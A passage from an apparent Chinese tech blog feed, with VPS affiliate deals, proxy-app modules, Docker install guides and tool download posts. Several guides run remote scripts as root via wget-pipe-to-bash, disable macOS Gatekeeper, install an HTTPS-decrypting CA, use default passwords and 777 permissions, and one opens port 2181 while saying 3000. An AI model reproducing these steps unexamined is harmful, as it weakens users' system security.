    <content><![CDATA[<p>RackNerd位于美国的主机服务提供商，主营VPS、虚拟主机和独立服务器业务。该公司以价格优势为主要卖点，最低年付不到10美元，流量超多。<br>特点<br>价格便宜，适合新手或者备用机，白天可以用来下载东西做一些消耗流量的操作，晚上建议作为备用。<br>线路为联通AS4837（推荐）、电信163（不推荐）、移动CMI（不100%），购买建议Los Angeles, CA (DC02)、San Jose, CA 这两个机房。<br>如果购买时没有相应的机房位置，可以先进行购买然后提工单进行换区域。支持自主更换IP，购买72h内，更换IP是免费的，系统不会生成账单。<br>本地如果支持IPv6，可以去工单申请一下IPv6（仅洛杉矶DC02），群友测试路由是直的，最多100个。相当于给你100个IPv6地址<br>推荐安装协议<br>Hysteria+RackNerd+端口跳跃（vasma-&gt;4-3），可能是对于新手最友好、最低廉的一个搭建方式（前提是本地运营商对UDP支持的较好）。<br>Tuic V5 相比于Hysteria更友好更不容易被QoS，推荐使用。<br>如果直连效果不好可以尝试套Cloudflare，优选最快节点，点击这里查看使用教程。<br>活动一（Memorial Day Sale）<br>针对洛杉矶的促销套餐 Los Angeles, CA (DC02)</p>
<table>
<thead>
<tr>
<th><center>内存</center></th>
<th><center>CPU</center></th>
<th><center>SSD</center></th>
<th><center>流量</center></th>
<th><center>价格</center></th>
<th><center>链接</center></th>
</tr>
</thead>
<tbody><tr>
<td><center>1G</center></td>
<td><center>1核</center></td>
<td><center>20G</center></td>
<td><center>3T&#x2F;月</center></td>
<td><center>$14.99&#x2F;年</center></td>
<td><center><a href="https://my.racknerd.com/aff.php?aff=2705&pid=770">购买</a></center></td>
</tr>
</tbody></table>
<p>活动二（复活节促销）San Jose, CA</p>
<table>
<thead>
<tr>
<th><center>内存</center></th>
<th><center>CPU</center></th>
<th><center>SSD</center></th>
<th><center>流量</center></th>
<th><center>价格</center></th>
<th><center>链接</center></th>
</tr>
</thead>
<tbody><tr>
<td><center>1G</center></td>
<td><center>1核</center></td>
<td><center>17G</center></td>
<td><center>3T&#x2F;月</center></td>
<td><center>$10.98&#x2F;年</center></td>
<td><center><a href="https://my.racknerd.com/aff.php?aff=2705&pid=358">购买</a></center></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>vps</category>
        <category>racknerd</category>
      </categories>
      <tags>
        <tag>vps</tag>
        <tag>racknerd</tag>
      </tags>
  </entry>
  <entry>
    <title>shadowrocket 配置和模块分享</title>
    <url>/posts/9bfdd06a/</url>
    <content><![CDATA[<h1 id="项目地址：https-github-com-deezertidal-shadowrocket-rules"><a href="#项目地址：https-github-com-deezertidal-shadowrocket-rules" class="headerlink" title="项目地址：https://github.com/deezertidal/shadowrocket-rules"></a>项目地址：<a href="https://github.com/deezertidal/shadowrocket-rules">https://github.com/deezertidal/shadowrocket-rules</a></h1><h1 id="YFamily个人网站（内含多种配置和模块）"><a href="#YFamily个人网站（内含多种配置和模块）" class="headerlink" title="YFamily个人网站（内含多种配置和模块）"></a>YFamily个人网站（内含多种配置和模块）</h1><p><a href="https://yfamily.ml/shadowrocket.html">https://yfamily.ml/shadowrocket.html</a></p>
<h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><p><a href="https://yfamily.ml/config/shadowrocket_basic.conf">https://yfamily.ml/config/shadowrocket_basic.conf</a></p>
<h1 id="配置文件-轻量"><a href="#配置文件-轻量" class="headerlink" title="配置文件-轻量"></a>配置文件-轻量</h1><p><a href="https://yfamily.ml/config/shadowrocket_lite.conf">https://yfamily.ml/config/shadowrocket_lite.conf</a></p>
<h1 id="iOS下载信任证书"><a href="#iOS下载信任证书" class="headerlink" title="iOS下载信任证书"></a>iOS下载信任证书</h1><p>shadowrocket配置——感叹号——HTTPS解密——证书授权——生成新的CA证书——允许<br>手机设置——证书下载——安装<br>手机设置——通用——关于本机——证书信任设置——打开shadowrocket证书开关</p>
<h1 id="自用模块"><a href="#自用模块" class="headerlink" title="自用模块"></a>自用模块</h1><h2 id="去开展广告融合版Ultra"><a href="#去开展广告融合版Ultra" class="headerlink" title="去开展广告融合版Ultra+"></a>去开展广告融合版Ultra+</h2><p><a href="https://yfamily.ml/module/adultraplus.module">https://yfamily.ml/module/adultraplus.module</a></p>
<h2 id="微信公众号去广告"><a href="#微信公众号去广告" class="headerlink" title="微信公众号去广告"></a>微信公众号去广告</h2><p><a href="https://yfamily.ml/module/wechatad.module">https://yfamily.ml/module/wechatad.module</a></p>
<h2 id="YouTube去广告（画中画，后台播放）"><a href="#YouTube去广告（画中画，后台播放）" class="headerlink" title="YouTube去广告（画中画，后台播放）"></a>YouTube去广告（画中画，后台播放）</h2><p><a href="https://yfamily.ml/module/YouTubeAd.sgmodule">https://yfamily.ml/module/YouTubeAd.sgmodule</a></p>
<h2 id="微博去广告"><a href="#微博去广告" class="headerlink" title="微博去广告"></a>微博去广告</h2><p><a href="https://yfamily.ml/module/weiboad.module">https://yfamily.ml/module/weiboad.module</a></p>
]]></content>
      <categories>
        <category>proxy</category>
        <category>shadowrocket</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>shadowrocket</tag>
      </tags>
  </entry>
  <entry>
    <title>bandwagonhost (搬瓦工) 建站VPS分享推荐 cn2-gt，gia 线路</title>
    <url>/posts/5255e9ef/</url>
    <content><![CDATA[<p>搬瓦工优惠码：BWHNCXNVXV</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>服务商</th>
<th>机房</th>
<th>CPU</th>
<th>内存</th>
<th>硬盘</th>
<th>带宽</th>
<th>流量</th>
<th>线路</th>
<th>IPV4</th>
<th>架构</th>
<th>价格</th>
<th>链接</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>搬瓦工-CN2</td>
<td>LA</td>
<td>1</td>
<td>1G</td>
<td>20G</td>
<td>1Gbps</td>
<td>1T&#x2F;月</td>
<td>CN2-GT</td>
<td>1</td>
<td>KVM</td>
<td>$49.99&#x2F;年</td>
<td><a href="https://bwh81.net/aff.php?aff=67086&pid=57">购买</a></td>
</tr>
<tr>
<td>2</td>
<td>搬瓦工-CN2</td>
<td>LA</td>
<td>1</td>
<td>2G</td>
<td>40G</td>
<td>1Gbps</td>
<td>2T&#x2F;月</td>
<td>CN2-GT</td>
<td>1</td>
<td>KVM</td>
<td>$99.99&#x2F;年</td>
<td><a href="https://bwh81.net/aff.php?aff=67086&pid=58">购买</a></td>
</tr>
<tr>
<td>3</td>
<td>搬瓦工-CN2</td>
<td>LA</td>
<td>2</td>
<td>4G</td>
<td>80G</td>
<td>1Gbps</td>
<td>3T&#x2F;月</td>
<td>CN2-GT</td>
<td>1</td>
<td>KVM</td>
<td>$199.99&#x2F;年</td>
<td><a href="https://bwh81.net/aff.php?aff=67086&pid=59">购买</a></td>
</tr>
<tr>
<td>4</td>
<td>DC9 CN2 GIA限量版</td>
<td>LA</td>
<td>1</td>
<td>1G</td>
<td>20G</td>
<td>1Gbps</td>
<td>500G&#x2F;月</td>
<td>CN2-GIA</td>
<td>1</td>
<td>KVM</td>
<td>$79.99&#x2F;年</td>
<td><a href="https://bwh81.net/aff.php?aff=67086&pid=112">购买</a></td>
</tr>
<tr>
<td>5</td>
<td>CN2 GIA-E 新款限量版</td>
<td>LA</td>
<td>1</td>
<td>1G</td>
<td>20G</td>
<td>1Gbps</td>
<td>500G&#x2F;月</td>
<td>CN2-GIA</td>
<td>1</td>
<td>KVM</td>
<td>$89.99&#x2F;年</td>
<td><a href="https://bwh81.net/aff.php?aff=67086&pid=105">购买</a></td>
</tr>
<tr>
<td>6</td>
<td>搬瓦工-CN2 GIA-E</td>
<td>LA</td>
<td>2</td>
<td>1G</td>
<td>20G</td>
<td>2.5Gbps</td>
<td>1T&#x2F;月</td>
<td>CN2-GIA</td>
<td>1</td>
<td>KVM</td>
<td>$50&#x2F;季</td>
<td><a href="https://bwh81.net/aff.php?aff=67086&pid=87">购买</a></td>
</tr>
<tr>
<td>7</td>
<td>搬瓦工-CN2 GIA-E</td>
<td>LA</td>
<td>3</td>
<td>2G</td>
<td>40G</td>
<td>2.5Gbps</td>
<td>2T&#x2F;月</td>
<td>CN2-GIA</td>
<td>1</td>
<td>KVM</td>
<td>$90&#x2F;季</td>
<td><a href="https://bwh81.net/aff.php?aff=67086&pid=88">购买</a></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>vps</category>
        <category>bandwagonhost</category>
      </categories>
      <tags>
        <tag>bandwagonhost</tag>
        <tag>vps</tag>
      </tags>
  </entry>
  <entry>
    <title>青龙面板 qinglong 忘记密码解决办法</title>
    <url>/posts/6f84b9e8/</url>
    <content><![CDATA[<p>auth.json储存username和password<br>一般位置在<br>&#x2F;var&#x2F;lib&#x2F;docker&#x2F;overlay2&#x2F;7137e14e449d8c55d58e451216fe3fed4d75bb8d05bac472cd218e7a32633edd&#x2F;diff&#x2F;ql&#x2F;data&#x2F;config</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#进去overlay2文件夹</span><br><span class="line">cd /var/lib/docker/overlay2/</span><br><span class="line">#然后搜索</span><br><span class="line">find / -name auth.json</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>tools</category>
        <category>qinglong</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>qinglong</tag>
      </tags>
  </entry>
  <entry>
    <title>umami 开源网站流量监控 docker 安装</title>
    <url>/posts/b18865dd/</url>
    <content><![CDATA[<h1 id="安装curl，git，vim，wget，docker，docker-compose等必备的工具"><a href="#安装curl，git，vim，wget，docker，docker-compose等必备的工具" class="headerlink" title="安装curl，git，vim，wget，docker，docker-compose等必备的工具"></a>安装curl，git，vim，wget，docker，docker-compose等必备的工具</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#升级系统</span></span><br><span class="line">apt update -y</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装curl、git、vim、wget</span></span><br><span class="line">apt install -y wget vim sudo curl git</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装docker</span></span><br><span class="line">wget -qO- get.docker.com | bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#检验docker安装成功</span></span><br><span class="line">docker -v</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动docker</span></span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看最新版本docker-compose并安装https://github.com/docker/compose/releases</span></span><br><span class="line"></span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/2.32.1/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加可执行权限:x</span></span><br><span class="line">sudo <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment">#在/usr/bin/路径下创建软连接</span></span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment">#检验docker-copose安装成功</span></span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>
<h1 id="新建项目文件夹"><a href="#新建项目文件夹" class="headerlink" title="新建项目文件夹"></a>新建项目文件夹</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="comment">#新建umami文件夹</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ~/data/docker_data/umami</span><br><span class="line"></span><br><span class="line"><span class="comment">#进去umami文件夹</span></span><br><span class="line"><span class="built_in">cd</span> ~/data/docker_data/umami</span><br></pre></td></tr></table></figure>
<h1 id="编辑配置文件"><a href="#编辑配置文件" class="headerlink" title="编辑配置文件"></a>编辑配置文件</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nano docker-compose.yml</span><br></pre></td></tr></table></figure>
<h1 id="写入docker-compose代码"><a href="#写入docker-compose代码" class="headerlink" title="写入docker-compose代码"></a>写入docker-compose代码</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line">services:</span><br><span class="line">  umami:</span><br><span class="line">    image: docker.umami.dev/umami-software/umami:postgresql-latest</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;3000:3000&quot;</span></span><br><span class="line">    environment:</span><br><span class="line">      DATABASE_URL: postgresql://umami:umami@db:5432/umami</span><br><span class="line">      DATABASE_TYPE: postgresql</span><br><span class="line">      APP_SECRET: replace-me-with-a-random-string</span><br><span class="line">    depends_on:</span><br><span class="line">      - db</span><br><span class="line">    restart: always</span><br><span class="line">  db:</span><br><span class="line">    image: postgres:15-alpine</span><br><span class="line">    environment:</span><br><span class="line">      POSTGRES_DB: umami</span><br><span class="line">      POSTGRES_USER: umami</span><br><span class="line">      POSTGRES_PASSWORD: umami</span><br><span class="line">    volumes:</span><br><span class="line">      - ./sql/schema.postgresql.sql:/docker-entrypoint-initdb.d/schema.postgresql.sql:ro</span><br><span class="line">      - ./umami-db-data:/var/lib/postgresql/data</span><br><span class="line">    restart: always</span><br></pre></td></tr></table></figure>
<p>检查完毕之后，ctrl+x退出，按y确认修改内容，enter确认</p>
<h1 id="启动Umami"><a href="#启动Umami" class="headerlink" title="启动Umami"></a>启动Umami</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<h1 id="甲骨文的Ubuntu开行3000端口"><a href="#甲骨文的Ubuntu开行3000端口" class="headerlink" title="甲骨文的Ubuntu开行3000端口"></a>甲骨文的Ubuntu开行3000端口</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 2181 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存规则</span></span><br><span class="line">iptables-save</span><br><span class="line"></span><br><span class="line"><span class="comment">#永久保存规则</span></span><br><span class="line">netfilter-persistent save</span><br><span class="line">netfilter-persistent reload</span><br></pre></td></tr></table></figure>
<h1 id="访问http-ip-3000-用户名admin，密码umami"><a href="#访问http-ip-3000-用户名admin，密码umami" class="headerlink" title="访问http://ip:3000 用户名admin，密码umami"></a>访问<a href="http://ip:3000/">http://ip:3000</a> 用户名admin，密码umami</h1>]]></content>
      <categories>
        <category>tools</category>
        <category>web</category>
        <category>docker</category>
        <category>umami</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>web</tag>
        <tag>docker</tag>
        <tag>umami</tag>
      </tags>
  </entry>
  <entry>
    <title>serverstatus 多服务器 VPS 监控 docker 安装</title>
    <url>/posts/454ccdfb/</url>
    <content><![CDATA[<p>项目地址：<a href="https://github.com/lidalao/ServerStatus">https://github.com/lidalao/ServerStatus</a></p>
<h1 id="安装docker，docker-compose"><a href="#安装docker，docker-compose" class="headerlink" title="安装docker，docker-compose"></a>安装docker，docker-compose</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装docker</span></span><br><span class="line">wget -qO- get.docker.com | bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#检验docker安装成功</span></span><br><span class="line">docker -v</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动docker</span></span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看最新版本docker-compose并安装https://github.com/docker/compose/releases</span></span><br><span class="line"></span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/2.32.1/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加可执行权限:x</span></span><br><span class="line">sudo <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment">#在/usr/bin/路径下创建软连接</span></span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment">#检验docker-copose安装成功</span></span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>
<h1 id="新建sss文件夹，下载ServerStatus源码安装"><a href="#新建sss文件夹，下载ServerStatus源码安装" class="headerlink" title="新建sss文件夹，下载ServerStatus源码安装"></a>新建sss文件夹，下载ServerStatus源码安装</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/data/docker_data/sss</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~/data/docker_data/sss</span><br><span class="line"></span><br><span class="line">wget --no-check-certificate https://raw.githubusercontent.com/lidalao/ServerStatus/master/sss.sh &amp;&amp; <span class="built_in">chmod</span> +x ./sss.sh &amp;&amp; sudo ./sss.sh YOUR_TG_CHAT_ID YOUR_TG_BOT_TOKEN</span><br></pre></td></tr></table></figure>
<p>注意替换YOUR_TG_CHAT_ID和YOUR_TG_BOT_TOKEN 如果没有Telegram的话，不带这俩参数也可以</p>
<p>web服务地址<a href="http://ip:8081/">http://ip:8081</a></p>
]]></content>
      <categories>
        <category>web</category>
        <category>serverstatus</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>serverstatus</tag>
      </tags>
  </entry>
  <entry>
    <title>uptime kuma 网站存活，网站监控 docker 安装</title>
    <url>/posts/37331719/</url>
    <content><![CDATA[<h1 id="安装docker，docker-compose"><a href="#安装docker，docker-compose" class="headerlink" title="安装docker，docker-compose"></a>安装docker，docker-compose</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装docker</span></span><br><span class="line">wget -qO- get.docker.com | bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#检验docker安装成功</span></span><br><span class="line">docker -v</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动docker</span></span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看最新版本docker-compose并安装https://github.com/docker/compose/releases</span></span><br><span class="line"></span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/2.32.1/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加可执行权限:x</span></span><br><span class="line">sudo <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment">#在/usr/bin/路径下创建软连接</span></span><br><span class="line"><span class="built_in">ln</span> -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br><span class="line"></span><br><span class="line"><span class="comment">#检验docker-copose安装成功</span></span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure>
<h1 id="docker-compose代码："><a href="#docker-compose代码：" class="headerlink" title="docker-compose代码："></a>docker-compose代码：</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">version: <span class="string">&#x27;3.3&#x27;</span></span><br><span class="line"></span><br><span class="line">services:</span><br><span class="line">  uptime-kuma:</span><br><span class="line">    image: louislam/uptime-kuma</span><br><span class="line">    container_name: uptime-kuma</span><br><span class="line">    volumes:</span><br><span class="line">      - ./uptime-kuma:/app/data</span><br><span class="line">    ports:</span><br><span class="line">      - 3001:3001</span><br></pre></td></tr></table></figure>
<h1 id="宝塔用户的话，添加下面的配置到nginx配置文件里"><a href="#宝塔用户的话，添加下面的配置到nginx配置文件里" class="headerlink" title="宝塔用户的话，添加下面的配置到nginx配置文件里"></a>宝塔用户的话，添加下面的配置到nginx配置文件里</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">proxy_set_header X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">proxy_set_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">proxy_pass http://127.0.0.1:3001/;</span><br><span class="line">proxy_http_version 1.1;</span><br><span class="line">proxy_set_header Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">proxy_set_header Connection <span class="string">&quot;upgrade&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>访问<a href="http://ip:3001/">http://ip:3001</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>web</category>
        <category>docker</category>
        <category>uptime</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>web</tag>
        <tag>docker</tag>
        <tag>uptime</tag>
      </tags>
  </entry>
  <entry>
    <title>excelgpt 一款接入chatgpt的excel插件，加倍提高工作效率</title>
    <url>/posts/67f6543a/</url>
    <content><![CDATA[<h1 id="Asterecho-ExcelGPT"><a href="#Asterecho-ExcelGPT" class="headerlink" title="Asterecho&#x2F;ExcelGPT"></a>Asterecho&#x2F;ExcelGPT</h1><p>项目地址：<a href="https://github.com/Asterecho/ExcelGPT">https://github.com/Asterecho/ExcelGPT</a><br>插件名称: ExcelGPT<br>作者：吃爆米花的小熊!</p>
<p><img src="/img/excelgpt/1.webp" alt="0adcfa0e49a674b9ddc2f55b982786e69ebe5747"><br><img src="/img/excelgpt/2.webp" alt="66fd0f8deb29088bf5eaf29257aaaeb889d4b180"></p>
<h1 id="WPS版"><a href="#WPS版" class="headerlink" title="WPS版"></a>WPS版</h1><p>ExcelGPTplusForWPS<br><a href="https://wwsf.lanzouw.com/isiGV10uyaij">https://wwsf.lanzouw.com/isiGV10uyaij</a> 密码:59fp<br>开发工具——加载项——浏览，选择xll插件即可</p>
<h1 id="Office版"><a href="#Office版" class="headerlink" title="Office版"></a>Office版</h1><p>ExcelGPTplusForOffice<br><a href="https://wwsf.lanzouw.com/i9Pk810uybob">https://wwsf.lanzouw.com/i9Pk810uybob</a> 密码:9qia<br>开发工具——Excel加载项（强调一下，不是左边蓝色图标那个加载项）——浏览，选择xll插件</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>ai</category>
        <category>excelgpt</category>
        <category>excelgpt</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>ai</tag>
        <tag>excelgpt</tag>
      </tags>
  </entry>
  <entry>
    <title>final2x 放大模糊图片不失真</title>
    <url>/posts/bc591f8f/</url>
    <content><![CDATA[<p>这是一个强大的工具，允许使用多个模型将图像超分辨率到任意尺寸，旨在增强图像的分辨率和质量，使图像更清晰、更详细。目前支持RealCUGAN、RealESRGAN、Waifu2x、SRMD等多种模型。</p>
<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://github.com/Tohrusky/Final2x">https://github.com/Tohrusky/Final2x</a></p>
<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>从<a href="https://github.com/Tohrusky/Final2x/releases">这里</a>下载最新版本</p>
<h1 id="MacOS-苹果系统"><a href="#MacOS-苹果系统" class="headerlink" title="MacOS 苹果系统"></a>MacOS 苹果系统</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo spctl --master-disable</span><br><span class="line"># Disable Gatekeeper, then allow applications downloaded from anywhere in System Preferences &gt; Security &amp; Privacy &gt; General</span><br><span class="line">xattr -cr /Applications/Final2x.app</span><br></pre></td></tr></table></figure>
<p>第一次，您需要在终端中运行上面的命令来允许应用程序运行，并且由于Apple的Check，第一次进程可能会非常慢。</p>
<h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><p>对于一般Linux（建议下载linux-pip）<br>Python &gt;&#x3D; 3.6, then check install in terminal<br>Python &gt;&#x3D; 3.6，然后在终端中检查安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install Final2x-core</span><br><span class="line">Final2x-core -o # 114514</span><br></pre></td></tr></table></figure>
<p>对于 Deb&#x2F;Ubuntu<br>为文件和资源文件夹设置777权限</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>final2x</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>final2x</tag>
      </tags>
  </entry>
  <entry>
    <title>handbrake 开源视频转码压缩工具</title>
    <url>/posts/c49b2124/</url>
    <content><![CDATA[<p>HandBrake 是一款由志愿者构建的开源工具，用于将视频从几乎任何格式转换为一系列广泛支持的现代编解码器。</p>
<p>您会喜欢 HandBrake 的原因：</p>
<ul>
<li>转换几乎任何格式的视频</li>
<li>免费和开源</li>
<li>Multi-Platform (Windows, Mac and Linux)</li>
</ul>
<p>下载地址：<br><a href="https://handbrake.fr/downloads.php">https://handbrake.fr/downloads.php</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>handbrake</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>handbrake</tag>
      </tags>
  </entry>
  <entry>
    <title>memreduct 监视和清理计算机上的系统内存</title>
    <url>/posts/1676a2c1/</url>
    <content><![CDATA[<p>描述：<br>轻量级实时内存管理应用程序，用于监视和清理计算机上的系统内存。</p>
<p>该程序使用未记录的内部系统功能（本机 API）来清除系统缓存（系统工作集、工作集、备用页面列表、修改页面列表），结果可变约 10-50%。应用程序它与Windows XP SP3和更高版本的操作系统兼容，但一些通用功能仅从Windows Vista开始提供。</p>
<p>您可以下载安装程序或便携式版本。为了正确工作，您需要管理员权限。</p>
<p>项目地址：<br><a href="https://github.com/henrypp/memreduct">https://github.com/henrypp/memreduct</a><br>下载地址：<br><a href="https://github.com/henrypp/memreduct/releases">https://github.com/henrypp/memreduct/releases</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>memreduct</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>memreduct</tag>
      </tags>
  </entry>
  <entry>
    <title>gopeed 支持所有平台（windows，macos，linux，android，web，docker）的高速下载器</title>
    <url>/posts/8756f61f/</url>
    <content><![CDATA[<p>一款支持全平台的下载器<br>开源、轻量、原生，支持（HTTP、BitTorrent、Magnet 等）协议下载。</p>
<p>支持的平台</p>
<ul>
<li>windows</li>
<li>macos</li>
<li>linux</li>
<li>android</li>
<li>web</li>
<li>docker</li>
</ul>
<p>下载地址：<br><a href="https://github.com/GopeedLab/gopeed/releases/latest">https://github.com/GopeedLab/gopeed/releases/latest</a></p>
<p>介绍<br>Gopeed（全称Go Speed）是 Golang + Flutter 开发的一款高速下载器，支持（HTTP、BitTorrent、Magnet）协议，支持全平台<br>提示：如果macos打开失败，请在终端执行 xattr -d com.apple.quarantine &#x2F;Applications&#x2F;Gopeed.app 命令</p>
<p>Command tool 命令工具<br>use go install: 使用 go install ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">go install github.com/GopeedLab/gopeed/cmd/gopeed@latest</span><br></pre></td></tr></table></figure>
<p>Docker 码头工人<br>Start directly 直接启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 9999:9999 -v /path/to/download:/download liwei2633/gopeed</span><br></pre></td></tr></table></figure>
<p>Using Docker Compose 使用 Docker 组合</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>访问 Gopeed<br>当 docker 容器运行时，您可以通过 <a href="http://localhost:9999/">http://localhost:9999</a> 访问网页。</p>
<p>提示：在设置页面修改下载路径为 &#x2F;download ，即可访问主机上下载的文件。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>gopeed</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>gopeed</tag>
      </tags>
  </entry>
  <entry>
    <title>tuic v5 配置在各平台（windows，andorid，ios）</title>
    <url>/posts/a8505fa6/</url>
    <content><![CDATA[<h1 id="一键脚本（Tuic原版）："><a href="#一键脚本（Tuic原版）：" class="headerlink" title="一键脚本（Tuic原版）："></a>一键脚本（Tuic原版）：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/imbalaomao/tuic-install/main/tuic.sh &amp;&amp; bash tuic.sh</span><br></pre></td></tr></table></figure>
<h1 id="一键脚本（Clash-Meta服务端）"><a href="#一键脚本（Clash-Meta服务端）" class="headerlink" title="一键脚本（Clash Meta服务端）"></a>一键脚本（Clash Meta服务端）</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/imbalaomao/tuic-install/main/tuic_clash.sh &amp;&amp; bash t</span><br></pre></td></tr></table></figure>
<h1 id="Windows端："><a href="#Windows端：" class="headerlink" title="Windows端："></a>Windows端：</h1><h2 id="Nekoray-设置"><a href="#Nekoray-设置" class="headerlink" title="Nekoray 设置"></a>Nekoray 设置</h2><p>粘贴json配置后，在地址处填入域名、端口处填入8443、Socks Port处填入1080、核心选择添加好的tuic核心、命令处填入-c %config%、配置文件后缀选择json，保存即可<br><img src="/img/tuic/1.webp" alt="1686488707-60695-image (2)"></p>
<h2 id="Clash-Meta设置（脚本中安装后会输出Clash-Meta配置，仅包含Tuic出站段，其余部分需自行填写）"><a href="#Clash-Meta设置（脚本中安装后会输出Clash-Meta配置，仅包含Tuic出站段，其余部分需自行填写）" class="headerlink" title="Clash Meta设置（脚本中安装后会输出Clash Meta配置，仅包含Tuic出站段，其余部分需自行填写）"></a>Clash Meta设置（脚本中安装后会输出Clash Meta配置，仅包含Tuic出站段，其余部分需自行填写）</h2><p>示例配置如下：</p>
